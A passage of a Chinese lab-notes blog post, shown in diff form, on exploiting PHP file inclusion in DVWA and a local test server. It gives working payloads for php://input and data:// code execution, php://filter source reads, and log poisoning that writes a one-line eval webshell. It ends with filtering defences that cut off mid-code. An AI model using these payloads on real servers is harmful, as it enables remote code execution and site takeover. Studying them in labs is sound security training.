+<p>​		这个时候我们打开我们的服务器，进去我们存储session的目录,然后找到对应的session文件，我们可以看到我们的内容已经成功写入到我们的session里面了。</p>
+<p><img src="image-20230515145937890.png" alt="image-20230515145937890"></p>
+<p>然后我们访问我们session文件发现我们写入的脚本已经成功被执行了</p>
+<p><img src="image-20230515150335917.png" alt="image-20230515150335917"></p>
+<p>接下来我们继续验证日志文件包含，但是我们需要满足条件才能进行文件包含，因为我们在读取文件的时候我们需要权限才能读取，我们看一下我们原本服务器日志文件的权限(这里看别人的)</p>
+<p><img src="image-20230515150609839.png" alt="image-20230515150609839"></p>
+<p>可以看到我们可读权限仅适用于当前用户和用户组，其它用户并没有可读的权限。为了验证我们的实验，我们将其它用户设置成可读的权限。这样我们就可以读取我们的日志文件了。</p>
+<p><img src="image-20230515150816516.png" alt="image-20230515150816516"></p>
+<p>​		现在我们就可以构造我们恶意的日志信息了，这里有一点需要注意下，我们在构造我们的日志信息的时候，不能直接在浏览器中构造（在url后面构造信息），因为如果直接在浏览器中构造，存储到日志信息的时候就会进行urlencode编码了，导致我们不能正常构造我们需要的日志信息，此时我们就需要BurpSuite工具了，通过抓包修改数据，这样存储的日志就不会进行urlencode编码了。</p>
+<p>这里用现成的图片, 我忘了截屏了</p>
+<p><img src="image-20230515155531236.png" alt="image-20230515155531236"></p>
+<p>可以看到已经写到了日志文件<img src="image-20230515155559038.png" alt="image-20230515155559038"></p>
+<p>这里不知道为何包含不了</p>
+<p><img src="image-20230515160747853.png" alt="image-20230515160747853"></p>
+<h3 id="1-6文件包含之伪协议利用">1.6文件包含之伪协议利用</h3>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">file://    #访问本地文件系统<br>http://    #访问HTTPs网址<br>ftp://     #访问ftp URL<br>php://     #访问输入输出流<br>zlib://    #压缩流<br>data://    #数据<br>ssh2://    #security shell2<br>expect://  #处理交互式的流<br>glob://    #查找匹配的文件路径<br></code></pre></td></tr></tbody></table></figure>
+<p>php语言内置了很多封装协议，而这些协议则是我们处理文件包含漏洞经常用到的方法，最常见的协议有以下几种：</p>
+<h4 id="php-input">php://input</h4>
+<p>php://input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php://input 来代替  $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。  enctype=“multipart/form-data” 的时候 php://input 是无效的。</p>
+<p>此协议需要allow_url_include为on，在之前也强调过了。Input伪协议可以访问请求的原始数据的只读流，在POST请求中访问POST的data部分，所以它才能执行我们构造的数据。</p>
+<p>php://input主要是用来执行php代码的，不过php://input需要以POST提交，这里我们先在URL中添加php://input然后抓包把GET修改为POST(但如下两图可以看出似乎不必把get修改为post)，最后在数据包的最后输入想要执行的代码就可以实现代码执行。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">用法：<br>#URL中:<br>?page=php://input<br><br>#请求数据中：<br>&lt;?php system(whoami);?&gt;  #这里是通过php代码执行系统命令whoami;<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516230618017.png" alt="image-20230516230618017"></p>
+<p><img src="image-20230515203832588.png" alt="image-20230515203832588"></p>
+<p>1、在文件包含页面，通过<code>burpsuite</code>抓包：</p>
+<p>2、用<code>burpsuite</code>抓包在<code>url</code>中输入<code>php://input</code>，在底部请求数据中可以写任意<code>PHP代码</code>：<br>
+获得<code>phpinfo</code>信息：</p>
+<p><img src="image-20230618151022245.png" alt="image-20230618151022245"></p>
+<p>3、通过<code>php代码</code>执行<code>系统命令</code>：</p>
+<p><img src="image-20230618151240465.png" alt="image-20230618151240465"></p>
+<p>4、写入一句话木马文件：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'test.php'</span>,<span class="hljs-string">'w'</span>),<span class="hljs-string">'&lt;?php @eval($_POST[test]);?&gt;'</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230618151412775.png" alt="image-20230618151412775"></p>
+<p><img src="image-20230807095555368.png" alt="image-20230807095555368"></p>
+<p>5、页面出现乱码解决：</p>
+<p>在setting设置中可以找到</p>
+<p><img src="image-20230618152038874.png" alt="image-20230618152038874"></p>
+<h4 id="php-filter">php://filter</h4>
+<p>php://filter 是一种元封装器， 设计用于数据流打开时的<a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/filters.php">筛选过滤</a>应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.readfile.php">readfile()</a>、 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file.php">file()</a>和 <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-get-contents.php">file_get_contents()</a>， 在数据流内容读取之前没有机会应用其他过滤器。</p>
+<p>php://filter 可以在执行代码前将代码换个方式读取出来，只是读取，不需要开启，读取源代码并进行 base64 编码输出，不然会直接当做 php 代码执行就看不到源代码内容了</p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p>只是读取，所以只需要开启<code>allow_url_fopen</code>，对<code>allow_url_include</code>不做要求。</p>
+</blockquote>
+<p><strong>用法：php://filter/read=convert.base64-encode/resource=要读取的文件</strong></p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=2.php<br>解密：&lt;?php phpinfo();?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516223039653.png" alt="image-20230516223039653"></p>
+<p>我们来看下我们用filter伪协议读取的文件，因为我们使用了转换过滤器，导致输出的结果是base64编码的格式</p>
+<p><img src="image-20230515203033424.png" alt="image-20230515203033424">base64解码得到flag</p>
+<p>当然里不单单只能读取当前目录下的文件，这里就演示一下另外一种读取方式，我将文件放在上一级目录中，通过php进行读取。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URL：http://192.168.10.150/1.php/?name=php://filter/read=convert.base64-encode/resource=../2.php<br></code></pre></td></tr></tbody></table></figure>
+<p>仔细看URL连接就能看出来，这里使用了之前提到的相对路径读取。</p>
+<p><img src="image-20230516230135728.png" alt="image-20230516230135728"></p>
+<p>其中filter伪协议内置了很多过滤器，有字符串过滤器，转换过滤器、压缩过滤器、加密过滤器等</p>
+<p><img src="image-20230515203117877.png" alt="image-20230515203117877"></p>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?page=php://filter/read=convert.base64-encode/resource=file1.php<br></code></pre></td></tr></tbody></table></figure>
+<p>1、调整DVWA的安全级别，并进入文件包含里面：</p>
+<p>2、使用<code>php://协议</code>进行文件包含<code>file1.php</code>，可以看到，已经返回了包含文件的<code>base64加密</code>源码：</p>
+<p><img src="image-20230618145030556.png" alt="image-20230618145030556"></p>
+<p>这个协议的含义为：通过php协议读取本地敏感文件的源代码，对读取的的文件进行base64加密，并返回加密后的文件内容。</p>
+<p><img src="image-20230618145101835.png" alt="image-20230618145101835"></p>
+<p>解密得到源码</p>
+<p>4、通过目录穿越的方法读取<code>index.php文件</code>：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?page=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=../../index.php</span><br></code></pre></td></tr></tbody></table></figure>
+<p>一般我们是在已知网站结构路径的前提下，获取网站的源代码。</p>
+<p><img src="image-20230618145832534.png" alt="image-20230618145832534"></p>
+<h4 id="file">file://</h4>
+<p>file:// — 访问本地文件系统, file其实和绝对路径读取差不多。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URL：http://192.168.10.150/1.php/?name=file://C:/Windows/win.ini<br></code></pre></td></tr></tbody></table></figure>
+<p>靶场源码：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">'page'</span> ]; <span class="hljs-comment">//定义一个变量，通过GET的请求方式接收我们包含的文件；</span><br><span class="hljs-comment">// Input validation</span><br><span class="hljs-keyword">if</span>( !<span class="hljs-title function_ invoke__">fnmatch</span>( <span class="hljs-string">"file*"</span>, <span class="hljs-variable">$file</span> ) &amp;&amp; <span class="hljs-variable">$file</span> != <span class="hljs-string">"include.php"</span> ) { <span class="hljs-comment">//如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件；</span><br>    <span class="hljs-comment">//语法:fnmatch(pattern,string,flags)：</span><br>    <span class="hljs-comment">//pattern 必需。规定要检索的模式；</span><br>    <span class="hljs-comment">//string 	必需。规定要检查的字符串或文件。</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"ERROR: File not found!"</span>; 则输出文件未发现，并且退出<br>    <span class="hljs-keyword">exit</span>;<br>}<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></tbody></table></figure>
+<p>校验流程：<code>通过GET的请求方式接收包含的文件--&gt;如果通过get方式传递过来的参数字符串中，开头没有以file*开头的字符串，并且不能包含include.php文件--&gt;则输出文件未发现，并且退出</code></p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p><code>file://</code> 用于访问本地文件系统，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">用法：<br><br>?page=file:///文件绝对路径<br></code></pre></td></tr></tbody></table></figure>
+<p>1、调整<code>DVWA</code>的安全级别，并进入文件包含里面：</p>
+<p>2、使用本地文件包含，没有发现文件：<br>
+注：通过上面源码我们发现，只要传入的参数的没有以<code>file</code>开头的字符，则输出文件未发现，并且退出。</p>
+<p><img src="image-20230618154220168.png" alt="image-20230618154220168"></p>
+<p>3、这里我们通过<code>file:///</code>协议进行绕过，发现可以访问<code>host文件</code>：<br>
+我们包含：<code>file:///C:\Windows\System32\drivers\etc\hosts</code></p>
+<p><img src="image-20230618154247884.png" alt="image-20230618154247884"></p>
+<h4 id="http">http: //</h4>
+<p>其实http这里的利用方式，除了能够跳转，还能进行远程包含进行漏洞执行。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URL：http://192.168.10.150/1.php/?name=http://www.baidu.com<br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516220251820.png" alt="image-20230516220251820"></p>
+<h4 id="data">data: //</h4>
+<p>从php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是php代码，就会执行任意代码。<br>
+这里需要注意若使用data的话需要allow_url_include 和allow_url_fopen为on。</p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p>和<code>php伪协议</code>的<code>input</code>类似，也可以执行任意代码，但利用条件和用法不同。<br>
+  条件：<code>allow_url_fopen</code>参数与<code>allow_url_include</code>都需开启。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#用法1：<br>?page=data:text/plain,&lt;?php 执行内容 ?&gt;<br>#用法2：<br>?page=data:text/plain;base64,编码后的php代码<br></code></pre></td></tr></tbody></table></figure>
+<p>1、使用<code>用法1</code>执行代码：<br>
+执行内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(whoami);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230618153431992.png" alt="image-20230618153431992"></p>
+<p>2、使用<code>用法2</code>执行代码：<br>
+执行内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(whoami);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><strong>注：经base64编码后的加号和等号要手动的url编码，以免浏览器识别不了。</strong><br>
+对执行内容进行<code>base64加密</code>：</p>
+<p><img src="image-20230618153527521.png" alt="image-20230618153527521"></p>
+<p>可以看到系统命令已经执行成功：</p>
+<p><img src="image-20230618153618016.png" alt="image-20230618153618016"></p>
+<h4 id="ftp-和ftps"><a href="ftp://%E5%92%8Cftps">ftp://和ftps</a>://</h4>
+<p>ftp:// – ftps:// — 访问 FTP(s) URLs</p>
+<h4 id="zip">zip://</h4>
+<p>可以访问压缩包里的文件。当他与包含函数结合时，zip://流会被当做php文件执行。</p>
+<p>下面是针对某些封装协议的利用方式和特点</p>
+<p><img src="image-20230515202840006.png" alt="image-20230515202840006"></p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p><code>zip://</code>可以访问压缩文件中的文件。<br>
+  条件： 使用<code>zip协议</code>，需要将<code>#</code>编码为<code>%23</code>，所以需要<code>PHP 的版本</code> &gt;=<code>5.3.0</code>，要是因为版本的问题无法将<code>#</code>编码成<code>%23</code>，可以手动把<code>#</code>改成<code>%23</code>。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">用法：<br>?page=zip://[压缩文件路径]#[压缩文件内的子文件名]<br></code></pre></td></tr></tbody></table></figure>
+<p>1、将靶机网站主目录下的<code>1.php</code>，压缩成<code>1.zip</code>压缩包：<br>
+内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230618152609471.png" alt="image-20230618152609471"></p>
+<p><img src="image-20230618152634352.png" alt="image-20230618152634352"></p>
+<p>2、通过<code>zip://伪协议</code>对它进行文件包含：</p>
+<p><img src="image-20230618152758818.png" alt="image-20230618152758818"></p>
+<p><strong>注：要是把压缩包的后缀改为其他任意格式的文件也可以正常使用</strong></p>
+<h4 id="compress-bzip2">compress.bzip2://</h4>
+<p>用法：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=compress.bzip2://D:/soft/phpStudy/www/file.bz2<br>【or】<br>?file=compress.bzip2://./file.bz2<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="compress-zlib">compress.zlib://</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?file=compress.zlib://D:/soft/phpStudy/www/file.gz<br>【or】<br>?file=compress.zlib://./file.gz<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="phar">phar://</h4>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p>与<code>zip://协议</code>类似，但用法不同，<code>zip://伪协议</code>中是用<code>#</code>把压缩文件路径和压缩文件的子文件名隔开，而<code>phar://伪协议</code>中是用<code>/</code>把压缩文件路径和压缩文件的子文件名隔开。</p>
+</blockquote>
+<p><strong>用法：</strong></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?page=phar:<span class="hljs-comment">//[压缩文件路径]/[压缩文件内的子文件名]</span><br></code></pre></td></tr></tbody></table></figure>
+<p>使用phar://对1.zip文件进行文件包含：</p>
+<p><img src="image-20230618153100303.png" alt="image-20230618153100303"></p>
+<h3 id="1-7文件包含日志读取">1.7文件包含日志读取</h3>
+<p>日志会记录客户端请求及服务器响应的信息，访问<a target="_blank" rel="noopener" href="http://www.xx.com/">http://www.xx.com/</a><!--?php phpinfo(); ?-->时，<!--?php phpinfo(); ?-->也会被记录在日志里，也可以插入到User-Agent，但是请求的信息有可能被url编码之后记录日志，这里可以通过burp来发送请求包来防止被编码，通过相对路径找到日志文件，利用包含漏洞执行。各类日志存在位置</p>
+<h4 id="1-1-漏洞原理">1.1 漏洞原理</h4>
+<pre><code>  当某个PHP文件存在本地包含漏洞，而却无法上传正常文件，这就意味这有包含漏洞却不能拿来利用，这时攻击者就有可能会利用apache日志文件来入侵。
+  Apache服务器运行后会生成两个日志文件，这两个文件是access.log(访问日志)和error.log(错误日志)，apache的日志文件记录下我们的操作，并且写到访问日志文件access.log之中。
+</code></pre>
+<h4 id="1-2-利用方法">1.2 利用方法</h4>
+<blockquote>
+<p>通过日志文件<code>getshell</code>：<br>
+1.通过<code>burpsuite</code>发送的请求包产生日志数据；<br>
+2.包含日志文件；<br>
+3.写入一句话木马<code>getshell</code></p>
+</blockquote>
+<h4 id="1-3-Apache">1.3 Apache</h4>
+<p>apache存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1）Windows系统：<br>apache安装目录/logs/access.log或者error.log<br>2）linux系统：<br>/var/log/apache/access.log或者error.log<br>/var/log/apache2/access.log或者error.log<br>/etc/httpd/logs/access_log或者error.log<br></code></pre></td></tr></tbody></table></figure>
+<p>实操：</p>
+<p><strong>1. 日志文件路径：</strong></p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">D:\labwork\phpstudy_pro\Extensions\Apache2.<span class="hljs-number">4.39</span>\logs<br></code></pre></td></tr></tbody></table></figure>
+<p>这里主要查看<code>access.log</code>这个日志，这个日志记录着服务器所有的<code>访问记录</code>，包括一些攻击流量：</p>
+<p><img src="image-20230618155009816.png" alt="image-20230618155009816"></p>
+<p><strong>2. 没有access.log访问日志的原因：</strong></p>
+<p>进入日志目录下，如果发现没有<code>access.log</code>这个访问日志，是因为<code>apache配置文件</code>没有打开这个配置选项，需要对相应的功能进行开启。</p>
+<p><strong>3. 开启access.log访问日志功能：</strong></p>
+<p>1、通过配置文件的开启<code>access.log</code>访问日志功能：</p>
+<p><img src="image-20230618155144846.png" alt="image-20230618155144846"></p>
+<p>2、搜索<code>CustomLog "logs/access.log" common</code>，将前面的<code>##</code>注释去掉，并保存文件，然后重启<code>PHPstudy</code>:</p>
+<p><img src="image-20230618155202356.png" alt="image-20230618155202356"></p>
+<p><img src="image-20230618155211280.png" alt="image-20230618155211280"></p>
+<p>3、查看访问日志文件，日志目录下已经出现这个文件，说明成功开启访问日志功能：</p>
+<p>4、访问几个网页，查看记录，对自己访问的页面有记录，说明<code>access.log</code>可以自动记录访问操作：</p>
+<p><strong>实操过程：</strong></p>
+<p>1、我们通过访问，让访问日志记录我们的<code>phpinfo();</code>代码，可以看出，访问日志已经成功记录了我们的访问历史：<br>
+访问内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230618155413980.png" alt="image-20230618155413980"></p>
+<p><img src="image-20230618155406130.png" alt="image-20230618155406130"></p>
+<p>注：通过上图我们可以看出，日志已经成功记录我们的访问历史，但是是经过URL编码后的结果。如何让它记录我们原始完整的代码呢？一般URL编码是我们的浏览器进行完成的，它对我们访问的目录做了URL编码，然后发送到服务器，我们可以通过burpsuite，把经过浏览器URL编码后的数据进行修改。<br>
+2、使用burpsuite修改编码后的数据：</p>
+<p><img src="image-20230618155749757.png" alt="image-20230618155749757"></p>
+<p>3、查看访问日志，可以看出，没有编码的<code>phpinfo();</code>代码已经成功记录：</p>
+<p><img src="image-20230618155742513.png" alt="image-20230618155742513"></p>
+<p>4、文件包含只要文件中有<code>php代码</code>，它就会把这个文件当做<code>php脚</code>本进行解析，这样我们可以包含这个日志文件，让目标服务器把日志文件解析为<code>php脚本</code>；可以看出，已经成功解析日志文件为php脚本：</p>
+<p><img src="image-20230618155909255.png" alt="image-20230618155909255"></p>
+<p>5、让访问日志文件记录下写入文件脚本代码：<br>
+访问内容：</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$file</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">'test1.php'</span>,<span class="hljs-string">'w'</span>);<span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-variable">$file</span>,<span class="hljs-string">'&lt;?php @eval($_POST[1]);?&gt;'</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230618160406563.png" alt="image-20230618160406563"></p>
+<p><img src="image-20230618160346293.png" alt="image-20230618160346293"></p>
+<p>6、对访问日志进行文件包含，并查看创建的一句话脚本，已经创建成功：</p>
+<p><img src="image-20230618161548781.png" alt="image-20230618161548781"></p>
+<p>这里不知为何老是被截断，说是有特殊字符或者长度过长，我不理解，就先学个思路吧</p>
+<p>下面是成功者的图片</p>
+<p><img src="image-20230618161659832.png" alt="image-20230618161659832"></p>
+<p><img src="image-20230618161728358.png" alt="image-20230618161728358"></p>
+<p>7、使用蚁剑连接webshell，成功获得靶机的webshell权限：</p>
+<p><img src="image-20230618161745791.png" alt="image-20230618161745791"></p>
+<h4 id="1-4-Nginx">1.4 Nginx</h4>
+<p>nginx存在两个文件日志文件，access.log是记录登录等信息的日志文件，而error.log是错误文件。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1）Windows系统：<br>nginx安装目录/logs/access.log或者error.log<br>2）linux系统：<br>/var/log/nginx/access.log或者error.log<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="1-5-IIS">1.5 IIS</h4>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1）iis6.0版本<br>C:\windows\system32\LogFiles<br>2）iis7.5版本<br>%SystemDrive%\inetpub\logs\LogFiles<br></code></pre></td></tr></tbody></table></figure>
+<h4 id="1-6-包含Apache日志案例">1.6 包含Apache日志案例</h4>
+<p>Apache运行后一般默认会生成两个日志文件，access.log(访问日志)，error.log(错误日志)。<br>
+下图就是被转码的，只需要手动修改一下重新发送即可。(这里的转码就不叙述了, 上述有: 1.5.6 远程文件读取)</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">URL：http://192.168.10.150/&lt;?php @eval($_POST[123]);?&gt;<br></code></pre></td></tr></tbody></table></figure>
+<p>通过对本地的日志文件进行包含读取，输入123=phpinfo();。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">URL:http:<span class="hljs-comment">//192.168.10.150/1.php/?name=../Apache/logs/error.log</span><br>POST: <span class="hljs-number">123</span> = <span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></tbody></table></figure>
+<p>当然也可以使用蚁剑来进行连接。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">URL：http:<span class="hljs-comment">//192.168.10.150/1.php/?name=../Apache/logs/error.log</span><br>连接密码：<span class="hljs-number">123</span><br></code></pre></td></tr></tbody></table></figure>
+<p><img src="image-20230516232206856.png" alt="image-20230516232206856"></p>
+<h3 id="1-8文件包含漏洞攻击防范">1.8文件包含漏洞攻击防范</h3>
+<p>​		文件包含漏洞已经是Web安全史上经常用的攻击手段，且它的利用方式简单，造成的危害巨大，虽然我们现在已经有了很全面的防范对策，但是它的危害还是很大，上述实验我己经从多种角度解析了文件包含漏洞，也阐述了它可以做的事情已经造成的危害，下面我们开始着重介绍怎么对此漏洞进行防范和检测，避免造成不必要的损失。</p>
+<h4 id="0x01检查服务器配置文件">0x01检查服务器配置文件</h4>
+<p>​		在php中有个php.ini的配置文件，里面大概是对php语言所有功能配置文件集合，其中里面有两项是allow_url_fopen、allow_url_include两个选项，其中allow_url_fopen默认是开启的，allow_url_include默认是关闭的，如果我们开启这个配置文件，我们就可以使用伪协议读取我们的敏感信息和其它操作，虽然开启allow_url_fopen也可以读取我们的文件，但是我们可以通过过滤一些字符或者限制用户的输入从而达到攻击者不能读取我们信息的操作。</p>
+<h4 id="0x02过滤特殊符号">0x02过滤特殊符号</h4>
+<p>​		在进行文件包含的时候我们可能经常会用到几个固定的字符，或者我们在用伪协议的时候我们也会使用特定的字符，例如：\，//，input，output，filter等我们可以将这些铭感字符都给过滤掉。代码如下</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>( <span class="hljs-string">"http://"</span>,<span class="hljs-string">"file://"</span>), <span class="hljs-string">""</span>,<span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>(<span class="hljs-string">"../"</span>, <span class="hljs-string">"..\""</span>), <span class="hljs-string">""</span>,<span class="hljs-variable">$file</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-keyword">array</span>(<span class="hljs-string">"/"</span>, <span class="hljs-string">"\\"</span>), <span class="hljs-string">""</span>,<span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
+<p>此时我们再用我们之前的攻击手法，发现已经读取不到文件了。</p>
+<p><img src="image-20230516195741197.png" alt="image-20230516195741197"></p>
+<p>因为str_repleace只会替换一次，可以有办法绕过的，所以这里我们还有正则匹配的方式，只要用户输入的字符串被我们正则匹配我们就会警告结束程序的运行。我们来看下我们的源码。</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/..\/|http|ftp|\/|\/\//"</span>, <span class="hljs-variable">$file</span>)){<br>	<span class="hljs-keyword">echo</span> <span class="hljs-string">"不合法字符"</span>;<br>}<span 